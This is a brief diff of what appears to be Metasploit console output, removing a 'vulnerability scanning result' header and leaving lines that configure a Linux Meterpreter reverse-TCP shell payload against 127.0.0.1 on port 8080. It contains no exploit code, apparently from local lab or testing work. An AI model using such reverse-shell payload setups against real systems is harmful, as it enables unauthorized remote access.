@@ -1,7 +1,3 @@
-
-
-=========== Vulnerability scanning result of target 127.0.0.1 
-
 [*] Using configured payload linux/x86/meterpreter/reverse_tcp
 RHOSTS => 127.0.0.1
 RPORT => 8080
